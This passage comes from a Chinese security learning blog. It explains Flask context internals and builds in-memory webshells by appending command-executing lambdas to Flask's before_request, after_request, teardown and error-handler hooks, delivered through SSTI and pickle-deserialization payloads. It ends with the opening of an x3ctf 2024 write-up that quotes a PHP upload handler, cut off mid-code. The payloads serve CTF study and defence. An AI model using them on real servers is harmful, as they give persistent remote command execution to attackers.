class="string">通过sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]来获取当前app(使用__import__ app.py的不行)后，直接调用add_url_rule()来添加自定义函数</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></li></ol><h5 id="flask上下文机制"><a href="#flask上下文机制" class="headerlink" title="flask上下文机制"></a>flask上下文机制</h5><ol><li><p>先描述一下什么是上下文</p><ol><li><a href="https://www.zhihu.com/question/26387327">上下文概念理解</a></li><li>完成一个任务所有必要的信息: 比如函数&#x2F;请求&#x2F;应用</li><li>在实际编码过程中，上下文的存在有很多具体的形式。比如全局变量，ThreadLocal，函数参数；而在Flask中，上下文的概念是通过上下文栈结合对象(Local)的形式来实现的</li></ol></li><li><p><strong>Flask上下文</strong>: 使用上下文在请求处理期间临时存储特定数据，<a href="https://segmentfault.com/a/1190000004859568">很全面了</a></p><ol><li>请求上下文（Request Context）：存储请求相关信息，如 request 和 session</li><li>应用上下文（Application Context）：存储应用相关信息，如 current_app 和 g</li><li>上下文通过stack的结构来实现，每个线程都有自己的上下文栈</li></ol></li><li><p><strong>请求上下文</strong></p><ol><li>请求上下文包含以下对象<ol><li>request：封装当前 HTTP 请求的数据</li><li>session：存储用户会话信息</li></ol></li><li>请求上下文的生命周期<ol><li>请求开始：Flask 在收到请求时创建请求上下文和应用上下文，并将其推入上下文栈</li><li>请求处理：视图函数通过 request 和 session 等对象访问请求数据，中途可能会调用视图函数，钩子函数(before_request、after_request…)</li><li>请求结束：处理完成后，Flask 可能也会调用钩子函数(after_request)，然后弹出并销毁上下文，确保数据隔离</li></ol></li><li><strong>多线程下的请求上下文机制</strong><ol><li>每个线程在处理请求时，其上下文数据（如 request 和 session）是独立的，不会与其他线程冲突<ol><li>Local 类<ol><li>提供线程隔离的存储，Local 内部使用线程 ID 作为键，将数据存储在一个字典中。当某个线程访问 Local 对象时，Local 会根据当前线程的 ID 返回对应的数据</li><li>request 和 session 等对象都是基于 Local 实现的，故在不同线程中是隔离的</li></ol></li><li>_request_ctx_stack：基于 LocalStack 的请求上下文栈，用于管理请求上下文<ol><li>是一个 LocalStack 对象，管理请求上下文栈；LocalStack 是基于 Local 实现的栈结构: 每个线程都有自己的栈，栈中存储的是请求上下文对象（RequestContext）</li><li>_request_ctx_stack的作用: 其在 Flask 中是一个 全局对象<ol><li>当一个请求到达时，Flask 会创建一个 RequestContext 对象，并将其推入_request_ctx_stack</li><li>在请求处理过程中，可以通过 _request_ctx_stack.top 获取当前请求的上下文</li><li>请求处理完成后，Flask 会从 _request_ctx_stack 中弹出该请求的上下文</li></ol></li></ol></li></ol></li><li>剖析_request_ctx_stack和Local<ol><li><p>关系: 嵌套栈了</p><ol><li>全局对象：_request_ctx_stack 是 Flask 应用中的一个全局变量，所有线程共享同一个_request_ctx_stack 实例</li><li>线程局部独立性：由于 _request_ctx_stack 是基于 LocalStack 实现的，每个线程在访问_request_ctx_stack 时，实际上访问的是自己线程的独立栈</li></ol></li><li><p>给出一个_request_ctx_stack的结构图</p><ol><li>对于每个线程来说，_request_ctx_stack 的行为就像一个独立的栈：<ol><li>线程 1 只能看到自己的栈（包含请求上下文 1 和 2）</li><li>线程 2 只能看到自己的栈（包含请求上下文 3）</li><li>线程 3 只能看到自己的栈（包含请求上下文 4）</li></ol></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_request_ctx_stack (全局对象)</span><br><span class="line">│</span><br><span class="line">├── 线程 <span class="number">1</span></span><br><span class="line">│   └── 栈</span><br><span class="line">│       ├── 请求上下文 <span class="number">1</span> (RequestContext)</span><br><span class="line">│       └── 请求上下文 <span class="number">2</span> (RequestContext)</span><br><span class="line">│</span><br><span class="line">├── 线程 <span class="number">2</span></span><br><span class="line">│   └── 栈</span><br><span class="line">│       └── 请求上下文 <span class="number">3</span> (RequestContext)</span><br><span class="line">│</span><br><span class="line">└── 线程 <span class="number">3</span></span><br><span class="line">    └── 栈</span><br><span class="line">        └── 请求上下文 <span class="number">4</span> (RequestContext)</span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol></li><li><p><strong>应用上下文</strong></p><ol><li>current_app：指向当前处理请求的应用实例，指向当前app</li><li>g：用于存储请求期间的临时数据</li></ol></li></ol><h5 id="第一次请求"><a href="#第一次请求" class="headerlink" title="第一次请求"></a>第一次请求</h5><ol><li>Flask的安全设计中有<ol><li>Flask 应用程序设计为在开始处理请求之前进行配置和设置</li><li>一旦应用程序处理了它的第一个请求，它就被视为 “冻结”，并且不允许对应用程序进行任何进一步的修改（如添加路由或 URL 规则）<ol><li>这里其实是在某些函数调用时提供检查，所以可以通过底层来进行绕过</li></ol></li><li>在第一个请求后尝试修改应用程序会导致看到的 AssertionError</li></ol></li><li>第一个请求<ol><li>在 Flask 中，第一个请求通常是由用户发起的，而不是 Flask 自动完成的。也就是说，只有当用户通过浏览器、API 客户端或其他工具访问 Flask 应用的某个路由时，Flask 才会处理第一个请求</li><li>应用启动<ol><li>当运行 Flask 应用时（例如通过 app.run() 或 flask run），Flask 会启动一个开发服务器并等待请求。此时，应用已经初始化，但还没有处理任何请求</li></ol></li><li>第一个请求<ol><li>当用户访问 Flask 应用的某个路由（例如 &#x2F; 或 &#x2F;about）时，Flask 会处理第一个请求。</li><li>在第一个请求之后，Flask 会认为应用已经进入“运行状态”，并禁止对应用进行某些修改（例如添加路由或修改配置）</li></ol></li></ol></li><li>可以通过<code>app.got_first_request</code>来查看和修改(狗头)</li></ol><h4 id="高版本flask"><a href="#高版本flask" class="headerlink" title="高版本flask"></a>高版本flask</h4><h3 id="装饰器-钩子函"><a href="#装饰器-钩子函" class="headerlink" title="装饰器(钩子函)"></a>装饰器(钩子函)</h3><ol><li><p>ref</p><ol><li><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">gxngxn</a></li></ol></li><li><p>前置</p><ol><li>新版本flask</li></ol></li><li><p>利用原理与思想</p><ol><li>在新版本flask中，无法在初始化后再调用add_url_rule，需要考虑新的方式来添加路由(底层函数或者绕过)</li><li><strong>思想学习一下: 本质是对请求的处理[上下文]？那么可以考虑使用装饰器或者是任何有参与到请求处理的东西找机会&#x2F;向下底层探索</strong>，这里gxngxn也是使用这种方法，<a href="https://geek-docs.com/flask/flask-questions/69_flask_python_flask_after_request_and_before_request_for_a_specific_set_of_request.html">关于装饰器</a><ol><li><p>add_url_rule的底层函数调用比较复杂，这里就不进行探究了</p></li><li><p>before_request</p><ol><li><p>是class Scaffold的方法，是Flask类的父类，也就是app对象的父类了，可以获取底层的函数调用</p></li><li><p>忽略注释后底层调用了before_request_funcs.setdefault(None, []).append(f)底层函数，实践可以绕过check</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@setupmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>(<span class="params">self, f: T_before_request</span>) -&gt; T_before_request:</span><br><span class="line">    <span class="variable language_">self</span>.before_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure></li></ol></li><li><p>after_request</p><ol><li><p>f需要接收一个response对象，同时返回一个response对象</p></li><li><p>仅通过lambad无法对原始传进来的response进行修改后再返回，所以需要重新生成一个response对象，然后再返回这个response</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@setupmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after_request</span>(<span class="params">self, f: T_after_request</span>) -&gt; T_after_request:</span><br><span class="line"></span><br><span class="line">   <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">   ...</span></span><br><span class="line"><span class="string">   The function is called with the response object, and must return</span></span><br><span class="line"><span class="string">   a response object. This allows the functions to modify or</span></span><br><span class="line"><span class="string">   replace the response before it is sent.</span></span><br><span class="line"><span class="string">   ...</span></span><br><span class="line"><span class="string">   &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">   <span class="variable language_">self</span>.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br></pre></td></tr></table></figure></li></ol></li><li><p>其他钩子函数</p><ol><li><p>teardown_request: 用于在每个请求后执行清理操作。无论请求处理成功还是出现异常，这些注册的 teardown_request 函数都会被调用；其实还是无回显，所以比较鸡肋</p></li><li><p>errorhandler: 这个函数可以用于自定义404页面的回显，这里通过底层调用来实现，这里涉及到的原理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@setupmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">errorhandler</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self, code_or_exception: <span class="built_in">type</span>[Exception] | <span class="built_in">int</span></span></span><br><span class="line"><span class="params"></span>) -&gt; t.<span class="type">Callable</span>[[T_error_handler], T_error_handler]:</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">decorator</span>(<span class="params">f: T_error_handler</span>) -&gt; T_error_handler:</span><br><span class="line">      <span class="variable language_">self</span>.register_error_handler(code_or_exception, f)</span><br><span class="line">      <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> decorator</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_error_handler</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self,</span></span><br><span class="line"><span class="params">    code_or_exception: <span class="built_in">type</span>[Exception] | <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    f: ft.ErrorHandlerCallable,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;...&quot;&quot;&quot;</span></span><br><span class="line">    exc_class, code = <span class="variable language_">self</span>._get_exc_class_and_code(code_or_exception)</span><br><span class="line">    <span class="variable language_">self</span>.error_handler_spec[<span class="literal">None</span>][code][exc_class] = f</span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol></li><li><p>payload</p><ol><li>将执行的命令变成<code>request.args.get(&#39;cmd&#39;)</code>，这样就可以随时控制</li><li>这种方式的木马是打入内存的，在程序运行期间可用：在每个访问前，在每个访问后，在</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### payload1: before_request</span></span><br><span class="line">&#123;&#123;config.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;sys&quot;).modules[&quot;__main__&quot;].__dict__[&quot;app&quot;].before_request_funcs.setdefault(None,[]).append(lambda: __import__(&quot;os&quot;).popen(&quot;dir&quot;).read())&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### payload2: after_request</span></span><br><span class="line">&#123;&#123;config.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;sys&quot;).modules[&quot;__main__&quot;].__dict__[&quot;app&quot;].after_request_funcs.setdefault(None,[]).append(lambda resp: CmdResp if request.args.get(&quot;shell&quot;) and exec(&quot;global CmdResp; CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&quot;shell\&quot;)).read()&quot;)==None else resp)&#x27;</span>)&#125;&#125;</span><br><span class="line">   <span class="comment"># 展开好看一点</span></span><br><span class="line">   <span class="keyword">lambda</span> resp: <span class="comment">#传入参数</span></span><br><span class="line">      CmdResp <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>) <span class="keyword">and</span>      <span class="comment">#如果请求参数含有cmd则返回命令执行结果</span></span><br><span class="line">      <span class="built_in">exec</span>(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">          global CmdResp;     #定义一个全局变量，方便获取</span></span><br><span class="line"><span class="string">          CmdResp=make_response(os.popen(request.args.get(\&#x27;cmd\&#x27;)).read())   #创建一个响应对象</span></span><br><span class="line"><span class="string">      &#x27;</span>)==<span class="literal">None</span>    <span class="comment">#恒真</span></span><br><span class="line">      <span class="keyword">else</span> resp)  <span class="comment">#如果请求参数没有cmd则正常返回</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### payload3: teardown_request</span></span><br><span class="line">&#123;&#123;config.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;sys&quot;).modules[&quot;__main__&quot;].__dict__[&quot;app&quot;].teardown_request_funcs.setdefault(None,[]).append(lambda x: __import__(&quot;os&quot;).popen(&quot;dir&quot;).read())&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">### payload4: errorhandler</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="python中的装饰器"><a href="#python中的装饰器" class="headerlink" title="python中的装饰器"></a>python中的装饰器</h4><ol><li>要理解打内存马的payload还要理解python中的装饰器和flask中的源码写法</li></ol><h4 id="exec与eval的作用域"><a href="#exec与eval的作用域" class="headerlink" title="exec与eval的作用域"></a>exec与eval的作用域</h4><ol><li><p>在写after_request时，发现exec中的CmdResp和外部返回的CmdResp是同一个，来研究一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> resp: <span class="comment">#传入参数</span></span><br><span class="line">  CmdResp <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>) <span class="keyword">and</span>      <span class="comment">#如果请求参数含有cmd则返回命令执行结果</span></span><br><span class="line">   <span class="built_in">exec</span>(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">       global CmdResp;     #定义一个全局变量，方便获取</span></span><br><span class="line"><span class="string">       CmdResp=make_response(os.popen(request.args.get(\&#x27;cmd\&#x27;)).read())   #创建一个响应对象</span></span><br><span class="line"><span class="string">   &#x27;</span>)==<span class="literal">None</span>    <span class="comment">#恒真</span></span><br><span class="line">   <span class="keyword">else</span> resp)  <span class="comment">#如果请求参数没有cmd则正常返回</span></span><br></pre></td></tr></table></figure></li><li><p>exec的执行环境: <code>exec(object[, globals[, locals]])</code></p><ol><li><p><a href="https://docs.python.org/3/library/functions.html#exec">ref doc</a></p></li><li><p>默认情况下，exec 会在当前的局部和全局作用域中执行代码</p></li><li><p>如果传递了一个字典给 exec 的 globals 或 locals 参数，exec 会在这些字典定义的作用域中执行代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">10</span></span><br><span class="line">expr = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">z = 30</span></span><br><span class="line"><span class="string">sum = x + y + z</span></span><br><span class="line"><span class="string">print(sum)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    y = <span class="number">20</span></span><br><span class="line">    <span class="built_in">exec</span>(expr)</span><br><span class="line">    <span class="built_in">exec</span>(expr, &#123;<span class="string">&#x27;x&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;y&#x27;</span>: <span class="number">2</span>&#125;)</span><br><span class="line">    <span class="built_in">exec</span>(expr, &#123;<span class="string">&#x27;x&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;y&#x27;</span>: <span class="number">2</span>&#125;, &#123;<span class="string">&#x27;y&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;z&#x27;</span>: <span class="number">4</span>&#125;)</span><br><span class="line">    <span class="comment"># output</span></span><br><span class="line">    <span class="comment"># 60</span></span><br><span class="line">    <span class="comment"># 33</span></span><br><span class="line">    <span class="comment"># 34</span></span><br><span class="line"></span><br><span class="line">func()</span><br></pre></td></tr></table></figure></li><li><p>这里在exec内部执行global CmdResp，会在当前的全局作用域中定义CmdResp，所以在外部可以直接访问到，并且是先global定义后才返回CmdResp的，CmdResp已定义</p></li></ol></li><li><p>eval的执行环境: <code>eval(expression[, globals[, locals]])</code></p><ol><li><p>同exec不同，python的eval会返回表达式的值</p></li><li><p>如果 globals 和 locals 参数未提供，eval 会在当前的全局和局部作用域中执行代码，同exec一致</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行简单的数学表达式</span></span><br><span class="line">result = <span class="built_in">eval</span>(<span class="string">&quot;2 + 3 * 4&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 输出: 14</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行变量引用</span></span><br><span class="line">x = <span class="number">10</span></span><br><span class="line">result = <span class="built_in">eval</span>(<span class="string">&quot;x + 5&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 输出: 15</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在指定命名空间中执行表达式</span></span><br><span class="line">namespace = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line">result = <span class="built_in">eval</span>(<span class="string">&quot;a + b&quot;</span>, namespace)</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 输出: 5</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="小小总结-payload"><a href="#小小总结-payload" class="headerlink" title="小小总结+payload"></a>小小总结+payload</h3><h4 id="构造注意点"><a href="#构造注意点" class="headerlink" title="*构造注意点"></a>*构造注意点</h4><ol><li><p>打内存马需谨慎，打入后可能无法剔除，最好打入可控的参数</p><ol><li>装饰器方法就要这样进行注意</li></ol></li><li><p>python中eval和exec是有区别的</p><ol><li><p>exec动态执行 Python 代码（可以是多行代码或语句，并且始终返回None</p></li><li><p>eval动态执行单个 Python <strong>表达式</strong>，并返回表达式的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 表达式与语句的差别使得在pickle构造errorhandler时，需要使用exec，而下列payload打不通</span></span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;global exc_class; global code;exc_class,code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;kc1zs4&#x27;)).read()&quot;</span>,))</span><br></pre></td></tr></table></figure></li></ol></li><li><p>核心构造思想</p><ol><li>获取app: <code>用sys.modules[&#39;__main__&#39;].__dict__[&#39;app&#39;]</code></li><li>调用app可以调用的底层函数来打</li></ol></li></ol><h4 id="pickle-payload"><a href="#pickle-payload" class="headerlink" title="pickle payload"></a>pickle payload</h4><ol><li><p>前提</p><ol><li>使用pickle进行反序列化时，反序列化的类必须存在于当前的作用域中<ol><li>序列化：pickle将对象转换为字节流时，会保存对象的类名和属性值，但不会保存类的定义（即代码）</li><li>反序列化：pickle在反序列化时，会根据保存的类名尝试找到对应的类定义，然后重建对象。如果类不存在，会抛出AttributeError或ModuleNotFoundError</li></ol></li><li>传递字节码&#x2F;流时常用base64.b64encode()进行编码，然后在反序列化时使用base64.b64decode()进行解码</li><li>python中注意string和bytes的区别，bytes是不可变的，而string是可变的<ol><li>string -&gt; bytes: string.encode()</li><li>bytes -&gt; string: bytes.decode()</li><li><code>base64.b64decode</code>和<code>base64.b64encode</code>都是对bytes进行操作的</li></ol></li></ol></li><li><p>直接构造</p><ol><li>在pickle的方法中，由于是在request中进行处理，在exec和eval中可以访问到局部和全局变量，构造相比ssti容易的多</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">KC1zs4</span>():</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">      <span class="comment"># 还有一个报错回显，参考下面的ssti来构造即可</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># before_reqeust</span></span><br><span class="line">      <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda: __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;kc1zs4&#x27;)).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line">      <span class="comment"># after_request</span></span><br><span class="line">      <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;kc1zs4&#x27;) and exec(&#x27;global CmdResp; CmdResp=__import__(\&quot;flask\&quot;).make_response(__import__(\&quot;os\&quot;).popen(request.args.get(\&quot;kc1zs4\&quot;)).read())&#x27;)==None else resp)&quot;</span>,))</span><br><span class="line"></span><br><span class="line">      <span class="comment"># teardown_request无回显 pass</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># errorhandler</span></span><br><span class="line">      <span class="comment"># eval执行表达式，不可行: return (eval, (&quot;global exc_class; global code;exc_class,code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;kc1zs4&#x27;)).read()&quot;,))</span></span><br><span class="line">      <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda resp:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;kc1zs4&#x27;)).read()&quot;</span>,))</span><br></pre></td></tr></table></figure></li><li><p>pker构造</p></li></ol><h4 id="ssti-payload"><a href="#ssti-payload" class="headerlink" title="ssti payload"></a>ssti payload</h4><ol><li><p>前提</p><ol><li>flask jinjia2</li><li>绕过和构造可见《flask ssti》文章</li></ol></li><li><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">   </span><br></pre></td></tr></table></figure></li></ol><p><img src="/%E8%BF%99%E4%B8%AAssti%E9%93%BE%E5%AD%90%E7%9A%84%E6%8E%A8%E5%AF%BC%E6%9C%89%E5%BF%85%E8%A6%81%E5%86%8D%E5%AD%A6%E4%B8%80%E4%B8%8B__class__%EF%BC%8C__spec__%EF%BC%8C__init__%EF%BC%8C%E8%BF%98%E6%9C%89%E4%BB%80%E4%B9%88wrapper%E6%B2%A1%E6%9C%89__globals__"><br><img src="/ssti%E7%9A%84%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0%E4%B8%80%E4%B8%8B"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>x3ctf_2024</title>
      <link href="/2025/01/27/x3ctf_2024/"/>
      <url>/2025/01/27/x3ctf_2024/</url>
      
        <content type="html"><![CDATA[<h2 id="submission-复现-SV"><a href="#submission-复现-SV" class="headerlink" title="submission 复现 | SV"></a>submission 复现 | SV</h2><ol><li><p>考点居然是通配符注入</p></li><li><p>写一下之前错误的思路吧：源码审计</p><ol><li>这里其实抓住重点就是一个权限问题，&#x2F;uploads&#x2F;和&#x2F;是可以访问的<ol><li>思路1(不可行): 将文件上传到非uploads&#x2F;下，chmod时不会影响到，但是txt和basename难搞</li><li>思路2(不可行): 将文件move到&#x2F;uploads&#x2F;下的一小段时间内还没有chmod，可能可以竞争，不行，而且有txt无法执行</li></ol></li></ol> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$uploadOk</span> = <span class="number">1</span>;</span><br><span class="line">  <span class="variable">$target_dir</span> = <span class="string">&quot;/var/www/html/uploads/&quot;</span>;</span><br><span class="line">  <span class="variable">$target_file</span> = <span class="variable">$target_dir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 不能已经存在，phar不了，不可控</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$target_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, file already exists.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">50000</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file is too large you need to buy Nitro.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// txt后缀</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">str_ends_with</span>(<span class="variable">$target_file</span>, <span class="string">&#x27;.txt&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Due to exploit you can only upload files with .txt extensions sorry about this but we got hacked last time so we have to check this from now on.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check if $uploadOk is set to 0 by an error</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$uploadOk</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span 